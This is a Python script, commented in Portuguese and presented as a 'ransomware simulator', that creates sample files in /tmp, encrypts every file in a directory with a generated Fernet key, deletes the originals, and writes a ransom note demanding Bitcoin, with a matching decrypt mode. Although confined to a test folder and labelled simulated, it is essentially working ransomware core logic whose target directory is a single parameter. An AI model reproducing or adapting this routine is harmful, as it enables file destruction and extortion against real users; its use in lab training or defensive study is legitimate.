import os
import sys
from cryptography.fernet import Fernet
import time

# Diretório de teste (ajuste para um diretório seguro em sua VM)
TEST_DIR = "/tmp/test_files"  # Nunca use em diretórios críticos!

def setup_test_files():
    """Cria arquivos de teste para simulação."""
    os.makedirs(TEST_DIR, exist_ok=True)
    for i in range(5):
        with open(os.path.join(TEST_DIR, f"test_file_{i}.txt"), "w") as f:
            f.write(f"Arquivo de teste {i} - Conteúdo simulado.\n" * 10)
    print(f"[+] Arquivos de teste criados em {TEST_DIR}")

def generate_key():
    """Gera uma chave de criptografia Fernet."""
    key = Fernet.generate_key()
    with open("generated_key.key", "wb") as key_file:
        key_file.write(key)
    return key

def encrypt_files(key, directory=TEST_DIR):
    """Criptografa arquivos no diretório."""
    f = Fernet(key)
    encrypted_count = 0
    for root, dirs, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            try:
                with open(file_path, "rb") as original_file:
                    original_data = original_file.read()
                encrypted_data = f.encrypt(original_data)
                with open(file_path + ".encrypted", "wb") as encrypted_file:
                    encrypted_file.write(encrypted_data)
                os.remove(file_path)  # Remove original (apenas para simulação)
                encrypted_count += 1
                print(f"[+] Criptografado: {file_path}")
            except Exception as e:
                print(f"[-] Erro ao criptografar {file_path}: {e}")
    print(f"[+] Total de arquivos criptografados: {encrypted_count}")

def generate_ransom_note(key):
    """Gera nota de resgate (simulada)."""
    note = f"""
    === NOTA DE RESGATE SIMULADA ===
    Seus arquivos foram criptografados! Para recuperá-los:
    1. Pague 0.001 BTC para o endereço: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa (simulado)
    2. Envie o ID: {key.decode()[:20]}...
    3. Aguarde instruções.
    
    ATENÇÃO: Não modifique arquivos! Chave única gerada em: {time.ctime()}
    """
    with open(os.path.join(TEST_DIR, "READ_ME.txt"), "w") as f:
        f.write(note)
    print("[+] Nota de resgate gerada: READ_ME.txt")

def decrypt_files(key, directory=TEST_DIR):
    """Descriptografa arquivos (para recuperação simulada)."""
    f = Fernet(key)
    decrypted_count = 0
    for root, dirs, files in os.walk(directory):
        for file in files:
            if file.endswith(".encrypted"):
                file_path = os.path.join(root, file)
                try:
                    with open(file_path, "rb") as encrypted_file:
                        encrypted_data = encrypted_file.read()
                    decrypted_data = f.decrypt(encrypted_data)
                    original_path = file_path[:-10]  # Remove .encrypted
                    with open(original_path, "wb") as original_file:
                        original_file.write(decrypted_data)
                    os.remove(file_path)
                    decrypted_count += 1
                    print(f"[+] Descriptografado: {original_path}")
                except Exception as e:
                    print(f"[-] Erro ao descriptografar {file_path}: {e}")
    print(f"[+] Total de arquivos descriptografados: {decrypted_count}")

def main():
    if len(sys.argv) < 2:
        print("Uso: python3 ransomware_simulator.py [encrypt|decrypt]")
        sys.exit(1)
    
    action = sys.argv[1]
    setup_test_files()
    
    if action == "encrypt":
        key = generate_key()
        encrypt_files(key)
        generate_ransom_note(key)
        print("[*] Simulação completa! Chave salva em generated_key.key")
    elif action == "decrypt":
        try:
            with open("generated_key.key", "rb") as key_file:
                key = key_file.read()
            decrypt_files(key)
            print("[*] Descriptografia concluída.")
        except FileNotFoundError:
            print("[-] Chave não encontrada. Execute encrypt primeiro.")
    else:
        print("Ação inválida. Use 'encrypt' ou 'decrypt'.")

if __name__ == "__main__":
    main()
